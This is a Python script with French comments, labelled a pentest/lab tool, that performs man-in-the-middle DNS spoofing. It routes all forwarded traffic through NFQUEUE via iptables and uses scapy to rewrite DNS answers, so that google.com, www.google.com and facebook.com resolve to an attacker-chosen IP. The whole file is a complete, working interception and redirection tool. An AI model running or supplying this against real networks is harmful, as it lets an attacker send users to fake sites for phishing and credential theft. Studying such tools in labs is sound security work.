import logging
import os
import signal
import json
from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse

# ---------------------------------------------------------------
# MITM DNS Spoof Script (Pentest / Labo version)
# - Intercepte les paquets DNS en transit (FORWARD)
# - Modifie les réponses DNS pour des domaines choisis (dns_hosts)
# - Extensible : mapping JSON, logs DEBUG, IP spoof dynamique
# - Nettoyage propre iptables
# ---------------------------------------------------------------

# ====== ARGUMENTS ======
parser = argparse.ArgumentParser(description="DNS Spoof MITM (lab robust version)")
parser.add_argument("--spoof", type=str, default="192.168.198.129", help="IP à laquelle rediriger les domaines spoofés")
parser.add_argument("--debug", action="store_true", help="Active le mode debug (logs détaillés)")
parser.add_argument("--json", type=str, help="Fichier JSON de mapping DNS ('domain': 'ip')")
args = parser.parse_args()

# ====== LOGGING ======
LEVEL = logging.DEBUG if args.debug else logging.INFO
logging.basicConfig(level=LEVEL, format='%(asctime)s - %(levelname)s - %(message)s')

# ====== DNS HOST MAPPINGS ======
if args.json:
    # Optionnel : charge le mapping depuis un JSON { "domaine":"ip" }
    with open(args.json) as f:
        raw = json.load(f)
        # Normalise en bytes si clé était en str
        dns_hosts = {k.encode(): v for k, v in raw.items()}
    logging.info(f"Loaded DNS mappings from {args.json}: {dns_hosts}")
else:
    # Mapping de base (modifie l’IP pour ton labo)
    dns_hosts = {
        b"www.google.com.": args.spoof,
        b"google.com.": args.spoof,
        b"facebook.com.": args.spoof,
    }

def modify_packet(packet):
    """
    Modifie la réponse DNS si domaine dans dns_hosts.
    - Nettoie authority / additional / AAAA vieux records pour forcer le spoof.
    - Recalcule les checksums (IP/UDP/TCP) après modification du paquet.
    """
    qname = packet[DNSQR].qname
    logging.debug(f"Trying to spoof: {qname}")
    if qname not in dns_hosts:
        logging.info(f"No spoof for {qname} ({qname.decode(errors='ignore')})")
        return packet
    spoofed_ip = dns_hosts[qname]
    logging.info(f"Spoofing {qname.decode(errors='ignore')} to {spoofed_ip}")

    # Remplace tous les answers par une réponse A falsifiée
    packet[DNS].an = DNSRR(rrname=qname, rdata=spoofed_ip)
    packet[DNS].ancount = 1

    # Supprime authority/additional
    if packet[DNS].ar: packet[DNS].ar = None
    if packet[DNS].ns: packet[DNS].ns = None
    packet[DNS].arcount = 0
    packet[DNS].nscount = 0

    # Recalcul checksum/length
    del packet[IP].len
    del packet[IP].chksum
    if packet.haslayer(UDP):
        del packet[UDP].len
        del packet[UDP].chksum
    elif packet.haslayer(TCP):
        del packet[TCP].chksum
    return packet

def process_packet(netfilter_pkt):
    scapy_pkt = IP(netfilter_pkt.get_payload())
    # Debug : affiche toutes les requêtes DNS pour analyse qname
    if scapy_pkt.haslayer(DNSQR):
        logging.debug(f"DNS Question: {scapy_pkt[DNSQR].qname!r}")
    if scapy_pkt.haslayer(DNSRR) and scapy_pkt.haslayer(DNSQR):
        logging.info(f"DNS Response intercepted: {scapy_pkt[DNSQR].qname!r}")
        before = scapy_pkt.summary()
        scapy_pkt = modify_packet(scapy_pkt)
        after = scapy_pkt.summary()
        if args.debug:
            logging.debug(f"[Before]: {before}")
            logging.debug(f"[After ]: {after}")
        netfilter_pkt.set_payload(bytes(scapy_pkt))
    netfilter_pkt.accept()

def setup_iptables(queue_num):
    # Iptables large - attrape tout le flux FORWARD dans le MITM
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
    logging.info("iptables rule added (FORWARD/NFQUEUE).")

def cleanup_iptables(queue_num):
    # Nettoyage spécifique (supprime seulement la règle FORWARD/NFQUEUE)
    os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {queue_num}")
    logging.info("iptables rule removed.")

def signal_handler(sig, frame):
    logging.warning("Interrupted, cleaning iptables...")
    cleanup_iptables(QUEUE_NUM)
    exit(0)

if __name__ == "__main__":
    QUEUE_NUM = 0
    signal.signal(signal.SIGINT, signal_handler)
    setup_iptables(QUEUE_NUM)
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_packet)
        logging.info("MITM DNS spoof running (Ctrl+C = clean exit).")
        queue.run()
    except Exception as e:
        logging.error(f"NetfilterQueue error: {e}")
        cleanup_iptables(QUEUE_NUM)
